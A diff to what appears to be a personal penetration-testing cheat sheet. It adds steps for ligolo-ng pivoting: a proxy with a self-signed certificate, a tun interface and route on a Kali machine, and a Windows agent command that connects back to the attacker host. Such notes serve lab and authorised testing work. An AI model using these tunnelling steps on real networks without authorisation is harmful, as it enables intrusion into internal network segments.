@@ -594,8 +594,32 @@ PS C:\Windows\system32>
 
 # TODO - Da inserire nello cheatsheet
 
-> [!TODO]
-> Aggiungere ligolo-ng
+## Ligolo
+download linux and windows agents on the [release](https://github.com/nicocha30/ligolo-ng/releases) page.
+
+### Linux listener
+unzip the release folder and start the proxy file
+```bash
+./proxy -selfcert
+```
+
+Create new network interface
+```bash
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add <NetMask of target IP> dev ligolo
+```
+
+After that we have started the agent on windows machine on the terminal where we have launch the proxy file we can type 
+```bash
+session
+start
+```
+### Windows
+```powershell
+.\agent.exe -connect KALI:11601 -ignore-cert
+```
+
 
 ## RDP Connection
 ```
@@ -646,8 +670,4 @@ nimble install ptr_math nimcrypto hostname
 
 ```bash
 nim c -d:release --gc:markAndSweep -o:NimExec.exe Main.nim
-```
-
-
-```bash
 ```
